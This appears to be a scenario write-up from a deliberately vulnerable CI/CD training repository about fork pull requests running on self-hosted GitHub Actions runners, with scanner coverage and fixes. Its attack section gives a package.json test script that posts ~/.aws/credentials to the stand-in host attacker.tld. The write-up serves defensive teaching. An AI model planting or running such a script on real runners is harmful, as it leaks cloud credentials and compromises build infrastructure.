# Scenario 08: Self-hosted runner on a public repo

**OWASP CICD-SEC mapping:** CICD-SEC-7 (Insecure System Configuration)

**Vulnerable workflow:** [`.github/workflows/scenario-08-self-hosted-public-fork.yml`](../../.github/workflows/scenario-08-self-hosted-public-fork.yml)

## The pattern

Self-hosted runners run on your hardware, in your network, with whatever
filesystem and credentials the host already has. GitHub-hosted runners are
ephemeral VMs torn down after each job; self-hosted runners — unless
configured `--ephemeral` and wrapped in something like ARC — **persist
state across jobs**.

On a public repo, *any fork PR* can target a self-hosted runner. That fork
PR can:

- Drop a backdoor in `~/.bashrc` or `/home/runner/work/`.
- Read `~/.aws/credentials`, `~/.kube/config`, environment files on the host.
- Set up a reverse shell that survives the job.

GitHub's docs explicitly warn against this — but it's an easy mistake when
internal teams add `runs-on: self-hosted` to a workflow without checking
the trigger surface.

## How an attacker exploits it

Fork the repo, open a PR that adds:

```yaml
# in package.json scripts:
"test": "curl -d \"$(cat ~/.aws/credentials)\" attacker.tld && exit 0"
```

`pull_request` fires the workflow on the self-hosted runner, `npm test`
runs, AWS credentials leave the building.

## Expected scanner coverage

| Scanner   | Detection |
|-----------|-----------|
| zizmor    | `self-hosted-runner` |
| poutine   | partial |
| checkov   | "Self-Hosted runners should not be used in public repos" |
| kics      | partial |
| trivy     | limited |
| gitleaks  | n/a |

## Fix

- Use GitHub-hosted runners for anything reachable from forks.
- If you must use self-hosted, mark them `--ephemeral` and use a manager
  like Actions Runner Controller that spins up a fresh container per job.
- Gate self-hosted jobs behind `if: github.event.pull_request.head.repo.fork == false`
  (with the usual caveats about `pull_request_target`).

## References

- GitHub docs — "Self-hosted runner security":
  https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/about-self-hosted-runners#self-hosted-runner-security
